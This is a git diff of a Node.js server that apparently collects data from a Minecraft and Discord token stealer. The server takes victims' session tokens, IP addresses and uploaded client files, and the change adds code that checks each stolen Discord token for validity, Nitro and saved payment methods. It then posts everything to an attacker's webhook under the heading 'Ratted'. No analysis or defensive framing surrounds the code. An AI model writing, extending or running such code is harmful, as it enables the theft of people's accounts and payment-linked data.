@@ -103,14 +103,31 @@ app.post("/", (req, res) => {
                 const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
                 //get discord info
-                const discord = await (await get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", { headers: { "Authorization": req.body.discord, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+                let nitros = ""
+                let payments = ""
+
+                const discord = req.body.discord.split(" | ")
+
+                for await (const token of req.body.discord.split(" | ")) {
+                    let me = await (await get("https://discordapp.com/api/v9/users/@me", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: { id: null } } })).data
+                    if (me.id == null) {
+                        delete discord[token]
+                        continue
+                    }
+
+                    let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+                    nitros += nitro.length > 0 ? "Yes | " : "No | "
+
+                    let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+                    payments += payment.length > 0 ? "Yes | " : "No | "
+                }
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
                     content: `@everyone - ${formatNumber(total_networth)}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\`\nHas nitro: ${discord.length > 0}`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
